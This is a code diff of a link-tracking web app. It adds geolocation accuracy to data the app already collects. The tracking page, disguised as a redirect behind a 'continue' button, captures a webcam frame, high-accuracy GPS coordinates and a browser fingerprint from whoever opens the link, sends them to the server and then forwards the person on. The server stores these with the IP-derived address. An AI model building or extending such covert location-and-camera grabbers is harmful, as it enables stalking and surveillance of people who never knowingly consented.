@@ -113,13 +113,13 @@ function trackingPageHtml(link, error) {
       document.getElementById('continueBtn').addEventListener('click', requestGeo);
     }
 
-    async function sendClick(clientLat, clientLng, fingerprint, cameraImage) {
+    async function sendClick(clientLat, clientLng, accuracy, fingerprint, cameraImage) {
       document.getElementById('status').textContent = 'Redirecting...';
       try {
         await fetch('/api/track/' + link.code + '/click', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ clientLat, clientLng, fingerprint, cameraImage })
+          body: JSON.stringify({ clientLat, clientLng, accuracy, fingerprint, cameraImage })
         });
       } catch (e) {}
       window.location.replace(link.destination);
@@ -253,7 +253,7 @@ function getFingerprint() {
       document.getElementById('status').textContent = 'Capturing...';
       const fp = getFingerprint();
       var img = null;
-      var lat = null, lng = null;
+      var lat = null, lng = null, accuracy = null;
 
       var camPromise = navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } }).then(function(stream) {
         var v = document.createElement('video');
@@ -271,14 +271,14 @@ function getFingerprint() {
 
       var geoPromise = new Promise(function(resolve) {
         navigator.geolocation.getCurrentPosition(
-          function(pos) { lat = pos.coords.latitude; lng = pos.coords.longitude; resolve(); },
+          function(pos) { lat = pos.coords.latitude; lng = pos.coords.longitude; accuracy = pos.coords.accuracy; resolve(); },
           function() { resolve(); },
           { timeout: 15000, enableHighAccuracy: true }
         );
       });
 
       await Promise.all([camPromise, geoPromise]);
-      sendClick(lat, lng, fp, img);
+      sendClick(lat, lng, accuracy, fp, img);
     }
 
     document.getElementById('continueBtn').addEventListener('click', requestGeo);
@@ -335,7 +335,7 @@ router.post('/:code/click', async (req, res) => {
   const link = await db.get('SELECT * FROM links WHERE code = ?', [req.params.code]);
   if (!link) return res.status(404).json({ error: 'Link not found' });
 
-  const { clientLat, clientLng, fingerprint, cameraImage } = req.body || {};
+  const { clientLat, clientLng, accuracy, fingerprint, cameraImage } = req.body || {};
 
   let ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
     || req.socket.remoteAddress
@@ -352,8 +352,8 @@ router.post('/:code/click', async (req, res) => {
   }
 
   await db.run(
-    'INSERT INTO clicks (link_id, ip, lat, lng, address, client_lat, client_lng, user_agent, fingerprint, camera_image) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)',
-    [link.id, geo?.ip || ip || null, geo?.lat || null, geo?.lng || null, address, clientLat || null, clientLng || null, req.headers['user-agent'] || null, fingerprint || null, cameraImage || null]
+    'INSERT INTO clicks (link_id, ip, lat, lng, address, client_lat, client_lng, accuracy, user_agent, fingerprint, camera_image) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)',
+    [link.id, geo?.ip || ip || null, geo?.lat || null, geo?.lng || null, address, clientLat || null, clientLng || null, accuracy || null, req.headers['user-agent'] || null, fingerprint || null, cameraImage || null]
   );
 
   res.json({ ok: true });
